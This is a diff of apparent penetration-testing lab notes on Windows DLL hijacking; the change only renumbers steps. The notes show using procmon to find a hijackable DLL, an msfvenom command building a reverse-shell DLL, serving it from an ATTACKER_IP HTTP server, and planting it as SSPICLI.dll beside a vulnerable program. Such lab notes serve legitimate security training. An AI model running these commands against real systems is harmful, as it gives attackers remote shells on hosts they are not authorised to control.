@@ -74,10 +74,10 @@ STEP 3.) CHECK TO SEE IF DIRECTORY CAN BE WRITTEN TO
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 DLL Hijacking
 
-STEP 4.) 
+STEP 1.) 
 - procmon /AcceptEula
 
-STEP 5.)
+STEP 2.)
 - C:\Users\student\exercise_2\<vulnerable_task.exe>
       - Configure the following filters by pressing CTRL + L to open the filter menu:
         - Process Name contains putty.exe
@@ -86,19 +86,19 @@ STEP 5.)
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Creating Malicious DLL
 
-STEP 6.) DLL CREATION USING MSFVENOM
+STEP 1.) DLL CREATION USING MSFVENOM
 - msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=<xxxx> -f dll > bad.dll
 
 *** Once the malicious dll has been createdit must be uploaded to the host. Use scp, ftp, nc, python simple HTTP server, or copying and pasting base64 dump of file. ***
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Transferring the DLL
 
-STEP 7.) TRANSFER DLL TO TARGET MACHINE
+STEP 1.) TRANSFER DLL TO TARGET MACHINE
 - Create a Simple HTTP server, and then browse to it from the target:
       - On Machine with DLL: python -m SimpleHTTPServer 8000
       - On Target: Browse to http://ATTACKER_IP:8000
 
-STEP 8.) Put the retrieved DLL in the same location as vulnerable_task.exe
+STEP 2.) Put the retrieved DLL in the same location as vulnerable_task.exe
 - "PATH OF MALICIOUS DLL" "c:\users\student\exercise_2\SSPICLI.dll"
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Persistence
